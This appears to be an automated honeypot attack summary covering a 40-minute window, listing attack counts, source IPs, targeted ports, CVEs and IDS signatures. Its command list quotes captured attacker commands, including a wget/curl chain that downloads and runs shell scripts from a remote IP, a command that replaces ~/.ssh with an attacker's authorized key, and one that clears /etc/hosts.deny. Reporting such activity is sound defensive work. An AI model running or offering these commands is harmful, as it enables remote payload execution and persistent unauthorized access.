Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-16T02:01:28Z
**Timeframe:** 2025-10-16T01:20:01Z to 2025-10-16T02:00:01Z
**Log Files:**
- agg_log_20251016T012001Z.json
- agg_log_20251016T014001Z.json
- agg_log_20251016T020001Z.json

### Executive Summary

This report summarizes 17,370 events collected from the honeypot network over a 40-minute period. The majority of attacks were captured by the Honeytrap, Sentrypeer, and Suricata honeypots. A significant portion of the traffic was SIP (UDP/5060) and SMB (TCP/445) scanning. Several attackers attempted to download and execute malicious shell scripts, and a number of reconnaissance commands were observed. The most frequent attack signature detected was related to the DoublePulsar backdoor.

### Detailed Analysis

**Attacks by Honeypot:**
*   Honeytrap: 3886
*   Sentrypeer: 3289
*   Suricata: 3256
*   Cowrie: 2954
*   Ciscoasa: 1637
*   Dionaea: 1374
*   Mailoney: 860
*   Tanner: 23
*   H0neytr4p: 23
*   Redishoneypot: 22
*   Adbhoney: 13
*   ConPot: 9
*   Dicompot: 8
*   Honeyaml: 7
*   ElasticPot: 6
*   Medpot: 2
*   Ipphoney: 1

**Top Attacking IPs:**
*   14.178.247.149: 1341
*   51.89.1.88: 1242
*   103.106.219.216: 1232
*   185.243.5.121: 1037
*   206.191.154.180: 940
*   23.94.26.58: 835
*   86.54.42.238: 822
*   172.86.95.115: 485
*   172.86.95.98: 474
*   62.141.43.183: 254
*   107.170.36.5: 231
*   198.12.68.114: 203

**Top Targeted Ports/Protocols:**
*   5060: 3289
*   TCP/445: 1340
*   445: 1267
*   25: 854
*   22: 514
*   TCP/5900: 376
*   8333: 207

**Most Common CVEs:**
*   CVE-2002-0013
*   CVE-2002-0012
*   CVE-1999-0517
*   CVE-1999-0183
*   CVE-2019-11500
*   CVE-2016-20016

**Commands Attempted by Attackers:**
*   `cd /data/local/tmp/; busybox wget http://72.60.107.93/w.sh; sh w.sh; curl http://72.60.107.93/c.sh; sh c.sh; wget http://72.60.107.93/wget.sh; sh wget.sh; curl http://72.60.107.93/wget.sh; sh wget.sh; busybox wget http://72.60.107.93/wget.sh; sh wget.sh; busybox curl http://72.60.107.93/wget.sh; sh wget.sh`
*   `uname -s -v -n -r -m`
*   `whoami`
*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
*   `lockr -ia .ssh`
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
*   `cat /proc/cpuinfo | grep name | wc -l`
*   `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
*   `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
*   `ls -lh $(which ls)`
*   `which ls`
*   `crontab -l`
*   `w`
*   `uname -m`
*   `cat /proc/cpuinfo | grep model | grep name | wc -l`
*   `top`
*   `uname`
*   `uname -a`
*   `lscpu | grep Model`
*   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
*   `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
*   `Enter new UNIX password:`

**Signatures Triggered:**
*   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1336
*   ET DROP Dshield Block Listed Source group 1: 485
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 42: 217
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 41: 170
*   ET SCAN NMAP -sS window 1024: 156

**Users / Login Attempts:**
*   root/: 55
*   support/support: 4
*   supervisor/supervisor2020: 4
*   blank/11111: 4
*   ubnt/ubnt222: 4

**Files Uploaded/Downloaded:**
*   $(wget: 7
*   $(echo: 7
*   binary.sh: 6
*   wget.sh: 4
*   w.sh: 1
*   c.sh: 1
*   shadow.mpsl: 1

**HTTP User-Agents:**
*   No HTTP user agents were logged.

**SSH Clients and Servers:**
*   No SSH clients or servers were logged.

**Top Attacker AS Organizations:**
*   No attacker AS organizations were logged.

### Key Observations and Anomalies

*   **High Volume of SIP and SMB Traffic:** The most frequently targeted ports were 5060 (SIP) and 445 (SMB), indicating widespread scanning for vulnerabilities in VoIP and file-sharing services.
*   **DoublePulsar Activity:** The high number of "ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication" signatures suggests that many of the attacks on SMB are attempting to exploit the EternalBlue/DoublePulsar vulnerability.
*   **Reconnaissance and Payload Delivery:** Attackers were observed running a variety of reconnaissance commands to gather system information, followed by attempts to download and execute shell scripts from remote servers. This is a common pattern for establishing a foothold on a compromised system.
*   **SSH Key Manipulation:** The command to remove the existing `.ssh` directory and add a new authorized key is a clear attempt to gain persistent access to the machine.

This report provides a snapshot of the automated attacks targeting the honeypot network. The tactics, techniques, and procedures observed are consistent with botnet activity and opportunistic scanning. Continued monitoring is recommended.